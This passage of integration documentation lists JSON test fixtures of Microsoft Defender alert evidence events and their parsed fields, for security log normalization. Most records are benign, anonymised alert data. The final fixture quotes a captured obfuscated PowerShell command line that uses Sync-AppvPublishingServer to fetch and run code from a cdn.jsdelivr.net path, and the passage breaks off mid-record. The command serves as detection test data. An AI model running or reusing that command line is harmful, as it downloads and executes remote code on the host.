indows\",\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":13,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":\"john.doe@example.com\",\"OAuthApplicationId\":null,\"Categories\":\"[\\\"InitialAccess\\\"]\",\"Title\":\"PhishdeliveredduetoanETRoverride\",\"AttackTechniques\":\"[\\\"Phishing(T1566)\\\"]\",\"DetectionSource\":\"MicrosoftDefenderforOffice365\",\"Severity\":\"Informational\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2024-03-13T12:57:00Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-5-21-1111111111-222222222-444444444-333333",
                "AccountUPN": "john.doe@example.com",
                "ServiceSource": "MicrosoftDefenderforOffice365"
            }
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "file": {
            "directory": "C:\\Windows",
            "hash": {
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "splwow64.exe",
            "size": 13
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "44444444-4444-4444-4444-444444444444",
                    "severity": "Informational",
                    "title": "PhishdeliveredduetoanETRoverride"
                },
                "entity": {
                    "type": "Mailbox"
                },
                "evidence": {
                    "role": "Impacted"
                },
                "threat": {
                    "severity": "Informational"
                }
            }
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ],
            "user": [
                "john.doe"
            ]
        },
        "service": {
            "name": "MicrosoftDefenderforOffice365",
            "type": "MicrosoftDefenderforOffice365"
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "user": {
            "domain": "example",
            "id": "user1",
            "name": "john.doe"
        }
    }
    	
	```


=== "test_alert_evidence_4.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-07-10T14:55:15.3806039Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2025-07-10T14:55:15.3540000Z\",\"properties\":{\"Timestamp\":\"2025-07-10T14:52:35.9003059Z\",\"AlertId\":\"ed638877561142735991_1080012575\",\"EntityType\":\"Url\",\"EvidenceRole\":\"Related\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":\"uri=https://example.com/click?redirect=https://test-design.notion.site/003e2588dd144794913ce3159ff8ae1d?v=940b0b2d407b4d5baa94fe2c7bcb91e6&did=1752065831655&hashid=c6ee1588bac7b1a3fbdc362b12531815a24aef9f74347309ae8d5d79b5c3ecbeeb46fb&linkname=test%20use-cases\",\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"Url\\\":\\\"uri=https://example.com/click?redirect=https://test-design.notion.site/003e2588dd144794913ce3159ff8ae1d?v=940b0b2d407b4d5baa94fe2c7bcb91e6&did=1752065831655&hashid=c6ee1588bac7b1a3fbdc362b12531815a24aef9f74347309ae8d5d79b5c3ecbeeb46fb&linkname=test%20use-cases\\\",\\\"Type\\\":\\\"url\\\",\\\"MergeByKey\\\":\\\"vinNsJr8ywvsD9VKC7Ao6BMUTJI=\\\",\\\"MergeByKeyHex\\\":\\\"BE29CDB09AFCCB0BEC0FD54A0BB028E813144C92\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"DefenseEvasion\\\"]\",\"Title\":\"[SOC][MDE] User bypass SmartScreen warning\",\"AttackTechniques\":\"\",\"DetectionSource\":\"Custom detection\",\"Severity\":\"Medium\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2025-07-10T14:52:35.900305Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "ed638877561142735991_1080012575",
                    "severity": "Medium",
                    "title": "[SOC][MDE] User bypass SmartScreen warning"
                },
                "entity": {
                    "type": "Url"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "severity": "Medium"
                }
            }
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Custom detection"
        },
        "url": {
            "domain": "example.com",
            "full": "https://example.com/click?redirect=https://test-design.notion.site/003e2588dd144794913ce3159ff8ae1d?v=940b0b2d407b4d5baa94fe2c7bcb91e6&did=1752065831655&hashid=c6ee1588bac7b1a3fbdc362b12531815a24aef9f74347309ae8d5d79b5c3ecbeeb46fb&linkname=test%20use-cases",
            "original": "https://example.com/click?redirect=https://test-design.notion.site/003e2588dd144794913ce3159ff8ae1d?v=940b0b2d407b4d5baa94fe2c7bcb91e6&did=1752065831655&hashid=c6ee1588bac7b1a3fbdc362b12531815a24aef9f74347309ae8d5d79b5c3ecbeeb46fb&linkname=test%20use-cases",
            "path": "/click",
            "port": 443,
            "query": "redirect=https://test-design.notion.site/003e2588dd144794913ce3159ff8ae1d?v=940b0b2d407b4d5baa94fe2c7bcb91e6&did=1752065831655&hashid=c6ee1588bac7b1a3fbdc362b12531815a24aef9f74347309ae8d5d79b5c3ecbeeb46fb&linkname=test%20use-cases",
            "registered_domain": "example.com",
            "scheme": "https",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_alert_evidence_5.json"

    ```json
	
    {
        "message": "{\"time\": \"2026-01-13T09:40:18.1004753Z\", \"tenantId\": \"33333333-3333-3333-3333-333333333333\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-AlertEvidence\", \"_TimeReceivedBySvc\": \"2026-01-13T09:40:18.0830000Z\", \"properties\": {\"Timestamp\": \"2026-01-13T09:28:35.2919377Z\", \"AlertId\": \"da22222222-2222-2222-2222-222222222222_1\", \"EntityType\": \"File\", \"EvidenceRole\": \"Related\", \"SHA1\": \"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\", \"SHA256\": \"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\", \"RemoteIP\": null, \"LocalIP\": null, \"RemoteUrl\": null, \"AccountName\": null, \"AccountDomain\": null, \"AccountSid\": null, \"AccountObjectId\": null, \"DeviceId\": null, \"ThreatFamily\": null, \"EvidenceDirection\": null, \"AdditionalFields\": \"{\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\",\\\"Name\\\":\\\"SyncAppvPublishingServer.vbs\\\",\\\"Host\\\":{\\\"$id\\\":\\\"2\\\",\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"HOSTNAME\\\",\\\"NetBiosName\\\":\\\"example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"IpInterfaces\\\":[{\\\"$id\\\":\\\"3\\\",\\\"Address\\\":\\\"1.1.1.1\\\",\\\"Type\\\":\\\"ip\\\"}],\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:15.4348077Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:15.4348077Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"REDACTED\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"EnrichmentType\\\":\\\"MachineIpInterfacesEnrichment\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"dGVzdA==\\\",\\\"MergeByKeyHex\\\":\\\"00112233445566778899AABBCC\\\"},\\\"SizeInBytes\\\":1720,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"5\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"68b329da9893e34099c7d8ad5cb9c940\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"6\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2022-05-07T05:20:45.3950321Z\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:15.4348077Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:15.4348077Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"REDACTED\\\",\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T09:28:35.1921763Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2022-05-07T05:20:45.3950321Z\\\",\\\"KnownPrevalence\\\":546818,\\\"FirstSeen\\\":\\\"2024-08-28T12:05:55.0736105\\\",\\\"ReferenceId\\\":\\\"22222222-2222-2222-2222-222222222222:abc123\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"EnrichmentType\\\":\\\"FileInCommandLine\\\",\\\"IsIoc\\\":true,\\\"Role\\\":1,\\\"MergeByKey\\\":\\\"REDACTED\\\",\\\"MergeByKeyHex\\\":\\\"REDACTED\\\"}\", \"MachineGroup\": null, \"NetworkMessageId\": null, \"ServiceSource\": \"Microsoft Defender for Endpoint\", \"FileName\": \"SyncAppvPublishingServer.vbs\", \"FolderPath\": \"C:\\\\Windows\\\\System32\", \"ProcessCommandLine\": null, \"EmailSubject\": null, \"ApplicationId\": null, \"Application\": null, \"DeviceName\": null, \"FileSize\": 1720, \"RegistryKey\": null, \"RegistryValueName\": null, \"RegistryValueData\": null, \"AccountUpn\": null, \"OAuthApplicationId\": null, \"Categories\": \"[\\\"DefenseEvasion\\\"]\", \"Title\": \"Indirect command execution using a system utility\", \"AttackTechniques\": \"[\\\"Indirect Command Execution (T1202)\\\"]\", \"DetectionSource\": \"EDR\", \"Severity\": \"Low\", \"CloudResource\": null, \"CloudPlatform\": \"\", \"ResourceType\": null, \"ResourceID\": null, \"SubscriptionId\": \"\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:35.291937Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "file": {
            "directory": "C:\\Windows\\System32",
            "hash": {
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "SyncAppvPublishingServer.vbs",
            "size": 1720
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "da22222222-2222-2222-2222-222222222222_1",
                    "severity": "Low",
                    "title": "Indirect command execution using a system utility"
                },
                "entity": {
                    "type": "File"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "detection_status": "Detected",
                    "host": {
                        "last_remediation_state": "Active",
                        "remediation_providers": [
                            {
                                "RemediationDate": "2026-01-13T09:40:15.4348077Z",
                                "RemediationState": "Active",
                                "Type": "remediation-provider"
                            }
                        ]
                    },
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:40:15.4348077Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "EDR"
        }
    }
    	
	```


=== "test_alert_evidence_6.json"

    ```json
	
    {
        "message": "{\"time\": \"2026-01-26T17:22:09.2413837Z\", \"tenantId\": \"11111111-1111-1111-1111-111111111111\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-AlertEvidence\", \"_TimeReceivedBySvc\": \"2026-01-26T17:22:09.2220000Z\", \"properties\": {\"Timestamp\": \"2026-01-26T12:40:20.0992963Z\", \"AlertId\": \"ALERT_ID\", \"EntityType\": \"MailMessage\", \"EvidenceRole\": \"Related\", \"SHA1\": null, \"SHA256\": null, \"RemoteIP\": null, \"LocalIP\": null, \"RemoteUrl\": null, \"AccountName\": null, \"AccountDomain\": null, \"AccountSid\": null, \"AccountObjectId\": null, \"DeviceId\": null, \"ThreatFamily\": null, \"EvidenceDirection\": null, \"AdditionalFields\": \"{\\\"Urls\\\":[\\\"https://test.example.com/REDACTED\\\"],\\\"NetworkMessageId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"Asset\\\":false,\\\"Type\\\":\\\"mailMessage\\\",\\\"Role\\\":1,\\\"AttachmentCount\\\":0,\\\"UrlCount\\\":1,\\\"MergeByKey\\\":\\\"REDACTED\\\",\\\"MergeByKeyHex\\\":\\\"ANONYMIZED\\\"}\", \"MachineGroup\": null, \"NetworkMessageId\": \"22222222-2222-2222-2222-222222222222\", \"ServiceSource\": \"Microsoft Defender XDR\", \"FileName\": null, \"FolderPath\": null, \"ProcessCommandLine\": null, \"EmailSubject\": null, \"ApplicationId\": null, \"Application\": null, \"DeviceName\": null, \"FileSize\": null, \"RegistryKey\": null, \"RegistryValueName\": null, \"RegistryValueData\": null, \"AccountUpn\": null, \"OAuthApplicationId\": null, \"Categories\": \"[\\\"InitialAccess\\\"]\", \"Title\": \"User accessed a link in an email subsequently quarantined by ZAP\", \"AttackTechniques\": \"[\\\"Spearphishing Link (T1566.002)\\\"]\", \"DetectionSource\": \"Microsoft 365 Defender\", \"Severity\": \"Medium\", \"CloudResource\": null, \"CloudPlatform\": \"\", \"ResourceType\": null, \"ResourceID\": null, \"SubscriptionId\": \"\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-26T12:40:20.099296Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AttachmentCount": 0,
                "ServiceSource": "Microsoft Defender XDR",
                "UrlCount": 1
            }
        },
        "email": {
            "local_id": "22222222-2222-2222-2222-222222222222"
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "ALERT_ID",
                    "severity": "Medium",
                    "title": "User accessed a link in an email subsequently quarantined by ZAP"
                },
                "entity": {
                    "type": "MailMessage"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "severity": "Medium",
                    "urls": [
                        "https://test.example.com/REDACTED"
                    ]
                }
            }
        },
        "service": {
            "name": "Microsoft Defender XDR",
            "type": "Microsoft 365 Defender"
        },
        "url": {
            "domain": "test.example.com",
            "full": "https://test.example.com/REDACTED",
            "original": "https://test.example.com/REDACTED",
            "path": "/REDACTED",
            "port": 443,
            "registered_domain": "example.com",
            "scheme": "https",
            "subdomain": "test",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_alert_evidence_machine_remediation.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:40:52.1533495Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:40:52.1240000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:36.2236631Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"Machine\",\"EvidenceRole\":\"Impacted\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":\"11111111111111111111111111111111111111111111\",\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":\"hostname.example.local\",\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"Discovery\\\"]\",\"Title\":\"Suspicious Process Discovery\",\"AttackTechniques\":\"[\\\"Process Discovery (T1057)\\\",\\\"PowerShell (T1059.001)\\\"]\",\"DetectionSource\":\"EDR\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:36.223663Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "agent": {
            "id": "11111111111111111111111111111111111111111111"
        },
        "host": {
            "id": "11111111111111111111111111111111111111111111",
            "name": "hostname.example.local"
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious Process Discovery"
                },
                "entity": {
                    "type": "Machine"
                },
                "evidence": {
                    "role": "Impacted"
                },
                "threat": {
                    "detection_status": "Detected",
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:40:40.9701986Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "EDR"
        }
    }
    	
	```


=== "test_alert_evidence_machine_suspicious_behavior.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:30:50.3426771Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:30:50.3110000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:16.9500123Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"Machine\",\"EvidenceRole\":\"Impacted\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":\"11111111111111111111111111111111111111111111\",\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":\"hostname.example.local\",\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"SuspiciousActivity\\\"]\",\"Title\":\"Suspicious 'SuspClickFix' behavior was blocked\",\"AttackTechniques\":\"\",\"DetectionSource\":\"Antivirus\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:16.950012Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "agent": {
            "id": "11111111111111111111111111111111111111111111"
        },
        "host": {
            "id": "11111111111111111111111111111111111111111111",
            "name": "hostname.example.local"
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious 'SuspClickFix' behavior was blocked"
                },
                "entity": {
                    "type": "Machine"
                },
                "evidence": {
                    "role": "Impacted"
                },
                "threat": {
                    "detection_status": "Detected",
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:30:47.7219848Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Antivirus"
        }
    }
    	
	```


=== "test_alert_evidence_process_blocked.json"

    ```json
	
    {
        "message": "{\"time\": \"2026-01-13T09:30:50.3472681Z\", \"tenantId\": \"11111111-1111-1111-1111-111111111111\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-AlertEvidence\", \"_TimeReceivedBySvc\": \"2026-01-13T09:30:50.3110000Z\", \"properties\": {\"Timestamp\": \"2026-01-13T09:28:16.9500123Z\", \"AlertId\": \"11111111-1111-1111-1111-111111111111_1\", \"EntityType\": \"Process\", \"EvidenceRole\": \"Related\", \"SHA1\": \"1111111111111111111111111111111111111111\", \"SHA256\": \"1111111111111111111111111111111111111111111111111111111111111111\", \"RemoteIP\": null, \"LocalIP\": null, \"RemoteUrl\": null, \"AccountName\": null, \"AccountDomain\": null, \"AccountSid\": null, \"AccountObjectId\": null, \"DeviceId\": null, \"ThreatFamily\": null, \"EvidenceDirection\": null, \"AdditionalFields\": \"{\\\"ProcessId\\\": \\\"16108\\\", \\\"CommandLine\\\": \\\"\\\\\\\"powershell.exe\\\\\\\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}\\\", \\\"ElevationToken\\\": \\\"Default\\\", \\\"CreationTimeUtc\\\": \\\"2026-01-13T09:28:15.5061072Z\\\", \\\"ImageFile\\\": {\\\"$id\\\": \\\"2\\\", \\\"Directory\\\": \\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\", \\\"Name\\\": \\\"powershell.exe\\\", \\\"Host\\\": {\\\"$id\\\": \\\"3\\\", \\\"DnsDomain\\\": \\\"example.local\\\", \\\"HostName\\\": \\\"hostname\\\", \\\"NetBiosName\\\": \\\"hostname.example.local\\\", \\\"OSFamily\\\": \\\"Windows\\\", \\\"OSVersion\\\": \\\"10.0\\\", \\\"IsDomainJoined\\\": true, \\\"RemediationProviders\\\": [{\\\"RemediationState\\\": \\\"Active\\\", \\\"RemediationDate\\\": \\\"2026-01-13T09:30:47.7219848Z\\\", \\\"Type\\\": \\\"remediation-provider\\\"}], \\\"LastRemediationState\\\": \\\"Active\\\", \\\"ThreatAnalysisSummary\\\": [{\\\"AnalyzersResult\\\": [], \\\"Verdict\\\": \\\"Suspicious\\\", \\\"AnalysisDate\\\": 